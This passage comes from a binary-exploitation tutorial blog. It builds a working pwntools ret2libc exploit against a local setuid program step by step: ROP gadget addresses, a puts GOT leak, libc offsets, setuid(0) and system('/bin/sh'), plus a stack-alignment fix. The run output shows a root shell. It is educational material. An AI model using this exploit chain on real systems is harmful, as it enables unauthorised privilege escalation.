+<span class="p">[</span><span class="n">LOAD</span><span class="p">]</span> <span class="n">loading</span><span class="o">...</span> <span class="mi">100</span><span class="o">%</span>
+<span class="p">[</span><span class="n">LOAD</span><span class="p">]</span> <span class="n">removing</span> <span class="n">double</span> <span class="n">gadgets</span><span class="o">...</span> <span class="mi">100</span><span class="o">%</span>
+<span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">Searching</span> <span class="k">for</span> <span class="n">gadgets</span><span class="p">:</span> <span class="n">pop</span> <span class="n">rdi</span><span class="p">;</span> <span class="n">ret</span>
+
+<span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">File</span><span class="p">:</span> <span class="n">program</span>
+<span class="mh">0x000000000040117e</span><span class="p">:</span> <span class="n">pop</span> <span class="n">rdi</span><span class="p">;</span> <span class="n">ret</span><span class="p">;</span>
+</pre></div>
+<p>Great, let's incorporate this address into our exploit:</p><br/>
+<div class="highlight"><pre><span></span><span class="c1"># ROP gadgets</span>
+<span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x000000000040117e</span>
+</pre></div>
+<p>We'll also need the address of the <code>main</code> function, as we need to continue with our attack after leaking <code>puts()</code>. Essentially, we need to "restart" our program. To do this, we can use <code>readelf</code>.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">readelf</span> <span class="o">-</span><span class="n">s</span> <span class="n">program</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">main</span>
+    <span class="mi">34</span><span class="p">:</span> <span class="mi">00000000004011</span><span class="n">d2</span>    <span class="mi">40</span> <span class="n">FUNC</span>    <span class="n">GLOBAL</span> <span class="n">DEFAULT</span>   <span class="mi">15</span> <span class="n">main</span>
+</pre></div>
+<p>Let's include this address in our exploit:</p><br/>
+<div class="highlight"><pre><span></span><span class="c1"># binary symbols</span>
+<span class="n">puts_plt</span> <span class="o">=</span> <span class="mh">0x401060</span>
+<span class="n">puts_got</span> <span class="o">=</span> <span class="mh">0x404018</span>
+<span class="n">MAIN</span> <span class="o">=</span> <span class="mh">0x00000000004011d2</span>
+</pre></div>
+<p>Let's create a function to automate the process of leaking the GOT entry for <code>puts()</code>:</p><br/>
+<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">leak_puts</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
+
+    <span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">''</span>
+    <span class="n">buf</span> <span class="o">+=</span> <span class="n">junk</span>
+    <span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span>
+    <span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
+    <span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span>
+    <span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">MAIN</span><span class="p">)</span>
+
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+
+    <span class="n">leaked_puts</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">))</span>
+
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">"Leaked puts() -&gt; </span><span class="si">%s</span><span class="s2">"</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">leaked_puts</span><span class="p">))</span>
+
+    <span class="k">return</span> <span class="n">leaked_puts</span>
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">"./program"</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="s2">"error"</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+
+    <span class="n">leaked_puts</span> <span class="o">=</span> <span class="n">leak_puts</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+</pre></div>
+<p>As observed, the <code>leak_puts()</code> function performs exactly the same process we described earlier. First, it passes the junk (which corresponds to the long string needed to reach the return address). Then, we use the address of the <code>pop rdi; ret</code> gadget as the return address. Next, we provide the address of the GOT entry for <code>puts()</code>. This is the value that the <code>pop rdi</code> instruction will load into <code>rdi</code>. Finally, we pass the address of the PLT entry for <code>puts()</code>, which will be loaded into the <code>RIP</code> once the <code>ret</code> instruction of the ROP gadget is executed. We also pass the address of the <code>main</code> function since we need to "restart" the program to continue with our attack.</p><br/>
+<p>As you can see, after sending the payload, I perform two <code>p.recvline()</code> calls. The first one returns the output of the program that shows our entered string, while the second returns the output of the <code>puts()</code> call, which contains our desired value.</p><br/>
+<p>I also process the output of <code>puts()</code>, as it returns the leaked address in little-endian format. I reverse this process to convert it to an integer so we can perform mathematical operations on it. The <code>.ljust</code> method is used to ensure the output is 8 bytes long, which prevents the <code>u64()</code> method from failing if the returned address is shorter.</p><br/>
+<br/><h3 class="note">Note</h3><br/>
+<p>When sending the payload, we convert the addresses to little-endian format using <code>p64()</code>, a function included in the pwntools package. You can achieve the same result using the following methods:</p><br/>
+<div class="highlight"><pre><span></span><span class="c1"># .to_bytes</span>
+<span class="n">buf</span> <span class="o">=</span> <span class="n">puts_plt</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">"little"</span><span class="p">)</span>
+<span class="c1"># struct.pack</span>
+<span class="kn">import</span> <span class="nn">struct</span>
+<span class="n">buf</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">"&lt;Q"</span><span class="p">,</span> <span class="n">puts_plt</span><span class="p">)</span>
+</pre></div><br/><br/>
+<p>When executing the exploit, it successfully leaks the address of <code>puts()</code>:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">python</span> <span class="n">exp</span><span class="o">.</span><span class="n">py</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">local</span> <span class="n">process</span> <span class="s1">'./program'</span><span class="p">:</span> <span class="n">pid</span> <span class="mi">24328</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Leaked</span> <span class="n">puts</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="mh">0x7e901a480e50</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Stopped</span> <span class="n">process</span> <span class="s1">'./program'</span> <span class="p">(</span><span class="n">pid</span> <span class="mi">24328</span><span class="p">)</span>
+<span class="nd">elswix@ubuntu$</span>
+</pre></div>
+<p>That's pretty good, but we need the base address of libc to achieve calculating valid address for functions like <code>system()</code>. To do so, we first need to extract the offset of the <code>puts()</code> function within the libc binary (it must be exactly the same that is dynamically linked to the binary). As it's on my local machine, I can simply get it from that binary. Otherwise, if we we're against a CTF, you should obtain the exactly same libc binary (the same release) to extract those offsets due to the reason I've already explained earlier.</p><br/>
+<p>To obtain the offset of <code>puts()</code> we can use <code>readelf</code>:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">readelf</span> <span class="o">-</span><span class="n">s</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="o">.</span><span class="n">so</span><span class="mf">.6</span> <span class="o">|</span> <span class="n">grep</span> <span class="s2">" puts@@"</span>
+  <span class="mi">1429</span><span class="p">:</span> <span class="mf">0000000000080e50</span>   <span class="mi">409</span> <span class="n">FUNC</span>    <span class="n">WEAK</span>   <span class="n">DEFAULT</span>   <span class="mi">15</span> <span class="n">puts</span><span class="n">@</span><span class="n">@GLIBC_2</span><span class="mf">.2.5</span>
+</pre></div>
+<p>Let's add this to our script (remember to include it as a global variable):</p><br/>
+<div class="highlight"><pre><span></span><span class="c1"># libc offsets</span>
+<span class="n">puts_off</span> <span class="o">=</span> <span class="mh">0x80e50</span>
+</pre></div>
+<p>Note that you can remove the leading zeros because:</p><br/>
+<div class="highlight"><pre><span></span><span class="mh">0x0000000000080e50</span> <span class="o">=</span> <span class="mh">0x80e50</span>
+</pre></div>
+<p>Now that we have obtained the libc offset for <code>puts()</code>, we can subtract this offset from the leaked address to calculate the base address of libc at execution time:</p><br/>
+<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">"./program"</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="s2">"error"</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+
+    <span class="n">leaked_puts</span> <span class="o">=</span> <span class="n">leak_puts</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+
+    <span class="n">base_libc</span> <span class="o">=</span> <span class="n">leaked_puts</span> <span class="o">-</span> <span class="n">puts_off</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">"Base libc address -&gt; </span><span class="si">%s</span><span class="s2">"</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">base_libc</span><span class="p">))</span>
+</pre></div>
+<p>Let's see if everything works as expected:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">python</span> <span class="n">exp</span><span class="o">.</span><span class="n">py</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Leaked</span> <span class="n">puts</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="mh">0x7053d4480e50</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Base</span> <span class="n">libc</span> <span class="n">address</span> <span class="o">-&gt;</span> <span class="mh">0x7053d4400000</span>
+</pre></div>
+<p>Nice, it seems to work perfectly!</p><br/>
+<p>Once we have obtained the base address of libc at execution time, we can bypass ASLR by adding function offsets to this base address to calculate the valid addresses of the functions.</p><br/>
+<p>We could perform a classic Ret2libc attack by calling the <code>system()</code> function with the string <code>"/bin/sh"</code> as the parameter, which would grant us a shell. However, as discussed in <a href="https://elswix.github.io/articles/8/return-2-libc.html">Part 1</a>, we first need to call the <code>setuid()</code> function with <code>0</code> as the parameter before gaining a shell.</p><br/>
+<p>Since we can obtain the base libc address at execution time, we can add the <code>setuid()</code> function offset to this base address to determine the actual address of <code>setuid()</code>. To find this offset, we can use <code>readelf</code>. Additionally, I'll obtain the address of <code>system()</code> as well, since we’ll use it later.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">readelf</span> <span class="o">-</span><span class="n">s</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="o">.</span><span class="n">so</span><span class="mf">.6</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">E</span> <span class="s2">" system| setuid"</span>
+  <span class="mi">1481</span><span class="p">:</span> <span class="mi">0000000000050</span><span class="n">d70</span>    <span class="mi">45</span> <span class="n">FUNC</span>    <span class="n">WEAK</span>   <span class="n">DEFAULT</span>   <span class="mi">15</span> <span class="n">system</span><span class="n">@</span><span class="n">@GLIBC_2</span><span class="mf">.2.5</span>
+  <span class="mi">1961</span><span class="p">:</span> <span class="mi">00000000000</span><span class="n">ec0d0</span>   <span class="mi">136</span> <span class="n">FUNC</span>    <span class="n">WEAK</span>   <span class="n">DEFAULT</span>   <span class="mi">15</span> <span class="n">setuid</span><span class="n">@</span><span class="n">@GLIBC_2</span><span class="mf">.2.5</span>
+</pre></div>
+<p>Let's add them to our exploit:</p><br/>
+<div class="highlight"><pre><span></span><span class="c1"># libc offsets</span>
+<span class="n">puts_off</span> <span class="o">=</span> <span class="mh">0x80e50</span>
+<span class="n">system_off</span> <span class="o">=</span> <span class="mh">0x50d70</span>
+<span class="n">setuid_off</span> <span class="o">=</span> <span class="mh">0xec0d0</span>
+</pre></div>
+<p>Now, let's create a function that triggers the buffer overflow again (recall that we returned to the main function after leaking the <code>puts()</code> address), but this time calling <code>setuid()</code> with <code>0</code> as the parameter.</p><br/>
+<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">setuid</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">base_libc</span><span class="p">):</span>
+
+    <span class="n">setuid_addr</span> <span class="o">=</span> <span class="n">base_libc</span> <span class="o">+</span> <span class="n">setuid_off</span>
+
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">"setuid() -&gt; </span><span class="si">%s</span><span class="s2">"</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">setuid_addr</span><span class="p">))</span>
+
+    <span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">''</span>
+    <span class="n">buf</span> <span class="o">+=</span> <span class="n">junk</span>
+    <span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="c1"># pop rdi to load 0 into rdi</span>
+    <span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="c1"># 0 as the parameter for setuid()</span>
+    <span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">setuid_addr</span><span class="p">)</span> <span class="c1"># return to setuid()</span>
+    <span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">MAIN</span><span class="p">)</span> <span class="c1"># after calling setuid, "restart" the program </span>
+
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
+    <span class="n">setuid</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">base_libc</span><span class="p">)</span>
+</pre></div>
+<p>As you can see, to obtain the address of <code>setuid()</code>, we simply add its offset to the base libc address. Then, we repeat a process similar to what we did in <code>leak_puts()</code>.</p><br/>
+<p>The payload is straightforward. We overwrite the return address with the address of the ROP gadget that loads the value 0 (the root UID) into the <code>rdi</code> register, which is the parameter for <code>setuid()</code>. Next, we pass the address of <code>setuid()</code> so that when the <code>ret</code> instruction of the ROP gadget is executed, this address is loaded into the <code>RIP</code> register, redirecting the program flow to <code>setuid()</code>. Finally, once <code>setuid()</code> returns, the program will return to the main function.</p><br/>
+<p>Now, let's create another function to trigger the final buffer overflow, which will ultimately give us a shell. Earlier, we identified the offset of <code>system()</code>. We can now add this offset to the base libc address to obtain the actual address of <code>system()</code> in memory.</p><br/>
+<p>To gain a shell, we need the address of the string <code>"/bin/sh"</code> to pass as a parameter to <code>system()</code>. We can obtain this address using the <code>strings</code> utility:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">strings</span> <span class="o">-</span><span class="n">a</span> <span class="o">-</span><span class="n">t</span> <span class="n">x</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="o">.</span><span class="n">so</span><span class="mf">.6</span> <span class="o">|</span> <span class="n">grep</span> <span class="s2">"/bin/sh"</span>
+ <span class="mi">1</span><span class="n">d8678</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span>
+</pre></div>
+<p>Let's incorporate this into our exploit:</p><br/>
+<div class="highlight"><pre><span></span><span class="c1"># libc offsets</span>
+<span class="n">puts_off</span> <span class="o">=</span> <span class="mh">0x80e50</span>
+<span class="n">system_off</span> <span class="o">=</span> <span class="mh">0x50d70</span>
+<span class="n">setuid_off</span> <span class="o">=</span> <span class="mh">0xec0d0</span>
+<span class="n">bin_sh_off</span> <span class="o">=</span> <span class="mh">0x1d8678</span>
+</pre></div>
+<p>Now, let's create the function to obtain a shell.</p><br/>
+<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">shell</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">base_libc</span><span class="p">):</span>
+
+    <span class="n">system</span> <span class="o">=</span> <span class="n">base_libc</span> <span class="o">+</span> <span class="n">system_off</span>
+    <span class="n">bin_sh</span> <span class="o">=</span> <span class="n">base_libc</span> <span class="o">+</span> <span class="n">bin_sh_off</span>
+
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">"system() -&gt; </span><span class="si">%s</span><span class="s2">"</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">"</span><span class="se">\"</span><span class="s2">/bin/sh</span><span class="se">\"</span><span class="s2"> -&gt; </span><span class="si">%s</span><span class="s2">"</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">))</span>
+
+    <span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">''</span>
+    <span class="n">buf</span> <span class="o">+=</span> <span class="n">junk</span>
+    <span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span>
+    <span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
+    <span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
+
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
+    <span class="n">setuid</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">base_libc</span><span class="p">)</span>
+    <span class="n">shell</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">base_libc</span><span class="p">)</span>
+</pre></div>
+<p>As observed, we are repeating the same process as before to obtain the actual addresses. First, we overwrite the return address with the address of the ROP gadget. This gadget will load the address of the string <code>"/bin/sh"</code> into the <code>RDI</code> register, and then the <code>ret</code> instruction of the ROP gadget will load the address of <code>system()</code> into the <code>RIP</code> register.</p><br/>
+<p>If everything works as expected, executing the exploit should give us a shell with root privileges...</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">python</span> <span class="n">exp</span><span class="o">.</span><span class="n">py</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Leaked</span> <span class="n">puts</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="mh">0x71f971280e50</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Base</span> <span class="n">libc</span> <span class="n">address</span> <span class="o">-&gt;</span> <span class="mh">0x71f971200000</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">setuid</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="mh">0x71f9712ec0d0</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">system</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="mh">0x71f971250d70</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="s2">"/bin/sh"</span> <span class="o">-&gt;</span> <span class="mh">0x71f9713d8678</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Welcome</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Enter</span> <span class="n">a</span> <span class="n">string</span><span class="p">:</span> <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Your</span> <span class="n">string</span><span class="p">:</span> <span class="n">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><span class="o">~</span>\<span class="n">x11</span><span class="o">@</span>
+<span class="evrm">$</span> <span class="n">whoami</span>
+
+<span class="nd">elswix@ubuntu$</span>
+</pre></div>
+<p>It didn't work; the program simply closes after receiving some input. This is likely due to the stack not being correctly aligned. </p><br/>
+<p>After analysing the program behaviour in GDB, I noticed that it fails when executing the following <code>movaps</code> instruction:</p><br/>
+<p><img alt="" src="https://elswix.github.io/articles/11/img/5.png"/></p><br/>
+<p>As per the <a href="https://www.felixcloutier.com/x86/movaps">documentation</a> for the <code>movaps</code> instruction:</p><br/>
+<p><em>"When the source or destination operand is a memory operand, the operand must be aligned on a 16-byte (128-bit version), 32-byte (VEX.256 encoded version), or 64-byte (EVEX.512 encoded version) boundary, or a general-protection exception (#GP) will be generated."</em></p><br/>
+<p>Essentially, the crash occurs because the <a href="https://www.felixcloutier.com/x86/movaps">movaps</a> instruction requires that the destination operand be 16-byte aligned. This means that the memory address of the destination operand (in this case, the stack pointer) must be a multiple of 16. However, in this case, the stack pointer is not 16-byte aligned:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">gef$</span>  <span class="n">i</span> <span class="n">r</span> <span class="n">rsp</span>
+<span class="n">rsp</span>            <span class="mh">0x7ffd095dab58</span>      <span class="mh">0x7ffd095dab58</span>
+<span class="nd">gef$</span>
+</pre></div>
+<p>The address <code>0x7ffd095dab58</code> is not a multiple of 16, which causes the program to throw an exception. To resolve this, you should add 8 bytes to this address to make it a multiple of 16.</p><br/>
+<p>You can address this issue by inserting a <code>RET</code> instruction before the ROP gadget. The <code>RET</code> instruction pops a value off the stack and loads it into <code>RIP</code>. It also increments the stack pointer (RSP) by 8 bytes, which helps ensure that the stack pointer is 16-byte aligned when calling <code>system</code>.</p><br/>
+<p>Let's use <code>ropper</code> to find a suitable <code>RET</code> instruction.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">ropper</span> <span class="o">-</span><span class="n">f</span> <span class="n">program</span> <span class="o">--</span><span class="n">search</span> <span class="s2">"ret"</span>
+<span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">Load</span> <span class="n">gadgets</span> <span class="kn">from</span> <span class="nn">cache</span>
+<span class="p">[</span><span class="n">LOAD</span><span class="p">]</span> <span class="n">loading</span><span class="o">...</span> <span class="mi">100</span><span class="o">%</span>
+<span class="p">[</span><span class="n">LOAD</span><span class="p">]</span> <span class="n">removing</span> <span class="n">double</span> <span class="n">gadgets</span><span class="o">...</span> <span class="mi">100</span><span class="o">%</span>
+<span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">Searching</span> <span class="k">for</span> <span class="n">gadgets</span><span class="p">:</span> <span class="n">ret</span>
+
+<span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">File</span><span class="p">:</span> <span class="n">program</span>
+<span class="mh">0x000000000040101a</span><span class="p">:</span> <span class="n">ret</span><span class="p">;</span>
+</pre></div>
+<p>Let's incorporate it into our exploit: </p><br/>
+<div class="highlight"><pre><span></span><span class="c1"># ret (for stack allignment)</span>
+<span class="n">RET</span> <span class="o">=</span> <span class="mh">0x000000000040101a</span>
+</pre></div>
+<p>Now, let's add it as the return address in the <code>shell</code> function of our exploit:</p><br/>
+<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">shell</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">base_libc</span><span class="p">):</span>
+
+    <span class="n">system</span> <span class="o">=</span> <span class="n">base_libc</span> <span class="o">+</span> <span class="n">system_off</span>
+    <span class="n">bin_sh</span> <span class="o">=</span> <span class="n">base_libc</span> <span class="o">+</span> <span class="n">bin_sh_off</span>
+
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">"system() -&gt; </span><span class="si">%s</span><span class="s2">"</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">"</span><span class="se">\"</span><span class="s2">/bin/sh</span><span class="se">\"</span><span class="s2"> -&gt; </span><span class="si">%s</span><span class="s2">"</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">))</span>
+
+    <span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">''</span>
+    <span class="n">buf</span> <span class="o">+=</span> <span class="n">junk</span>
+    <span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">RET</span><span class="p">)</span>
+    <span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span>
+    <span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
+    <span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
+
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+<p>Let's execute the exploit:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">python</span> <span class="n">exp</span><span class="o">.</span><span class="n">py</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Leaked</span> <span class="n">puts</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="mh">0x70789fa80e50</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Base</span> <span class="n">libc</span> <span class="n">address</span> <span class="o">-&gt;</span> <span class="mh">0x70789fa00000</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">setuid</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="mh">0x70789faec0d0</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">system</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="mh">0x70789fa50d70</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="s2">"/bin/sh"</span> <span class="o">-&gt;</span> <span class="mh">0x70789fbd8678</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Welcome</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Enter</span> <span class="n">a</span> <span class="n">string</span><span class="p">:</span> <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Your</span> <span class="n">string</span><span class="p">:</span> <span class="n">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>\<span class="n">x1a</span>\<span class="n">x10</span><span class="o">@</span>
+<span class="evrm">$</span> <span class="n">whoami</span>
+<span class="n">root</span>
+<span class="evrm">$</span> <span class="nb">id</span>
+<span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">elswix</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">elswix</span><span class="p">),</span><span class="mi">4</span><span class="p">(</span><span class="n">adm</span><span class="p">),</span><span class="mi">24</span><span class="p">(</span><span class="n">cdrom</span><span class="p">),</span><span class="mi">27</span><span class="p">(</span><span class="n">sudo</span><span class="p">),</span><span class="mi">30</span><span class="p">(</span><span class="n">dip</span><span class="p">),</span><span class="mi">46</span><span class="p">(</span><span class="n">plugdev</span><span class="p">),</span><span class="mi">122</span><span class="p">(</span><span class="n">lpadmin</span><span class="p">),</span><span class="mi">135</span><span class="p">(</span><span class="n">lxd</span><span class="p">),</span><span class="mi">136</span><span class="p">(</span><span class="n">sambashare</span><span class="p">)</span>
+</pre></div>
+<p>As observed, it works properly, and we have successfully achieved privilege escalation through the buffer overflow vulnerability.</p><br/>
+<p><a href="exploit/">Here</a> is the final exploit.</p><br/>
+<h2>Conclusion</h2><br/>
+<p>In this article, we explored how to exploit a ret2libc attack, introducing 64-bit binary exploitation concepts such as ROP (Return-Oriented Programming) and calling conventions. As you may have noticed, the exploitation techniques are quite similar to those covered in Part 1; the primary difference is that we have tailored the exploit for a 64-bit version of the program.</p><br/>
